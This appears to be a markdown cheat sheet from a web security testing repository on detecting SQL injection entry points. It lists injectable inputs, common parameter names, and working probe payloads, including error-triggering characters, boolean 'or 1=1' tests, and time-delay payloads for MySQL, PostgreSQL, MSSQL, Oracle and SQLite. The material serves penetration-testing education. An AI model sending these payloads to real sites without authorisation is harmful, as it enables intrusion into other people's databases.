- ### [Injection Points](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/Entrypoint_Detection.md#injection-points-1)
- ### [List of Parametes](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/Entrypoint_Detection.md#list-of-parameters)
- ### [Giving Inputs](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/Entrypoint_Detection.md#giving-inputs)
     * [Error Based](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/Entrypoint_Detection.md#error-based)
     * [True False Based](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/Entrypoint_Detection.md#true-false-based)
     * [Timing Attacks](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/Entrypoint_Detection.md#timing-attacks)
  
---

### Injection Points  
We should check for areas where ever we can give inputs like ==>
- Login Form
- Url Search Parameters
- Url id values
- Cookie Values
- XML encoded values like <storeId>**</storeId>
- Form Input Sections
- File Upload Sections
### List of parameters
    id
    select
    report
    role
    update
    query
    user
    name
    sort
    where
    search
    params
    process
    row
    view
    table
    from
    sel
    results
    sleep
    fetch
    order
    keyword
    column
    field
    delete
    string
    number
    filter

## Giving Inputs
### Error Based
We try to trigger any SQL error by applying these characters and strings
- Simple characters `'`, `"`, `;`, `)`
- Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
- Multiple encoding: `%%2727`, `%25%27`
- Unicode characters: `U+02BA`, `U+02B9`
### True False Based
Here we are trying to enter true and false logics. In some casses the website behaves differently to the true and false condition.

    and 1
    and true
    ' -- true
    page.asp?id=1 or 1=1 -- true
    page.asp?id=1' or 1=1 -- true
    page.asp?id=1" or 1=1 -- true
    page.asp?id=1 and 1=2 -- false
### Timing Attacks
Inputting different SQL commands to hit a time delay that can suggest the website may be vulnerable

    MySQL (string concat and logical ops)
    1' + sleep(10)
    1' and sleep(10)
    1' && sleep(10)
    1' | sleep(10)
    
    PostgreSQL (only support string concat)
    1' || pg_sleep(10)
    
    MSQL
    1' WAITFOR DELAY '0:0:10'
    
    Oracle
    1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
    1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
    
    SQLite
    1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
    1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))






    
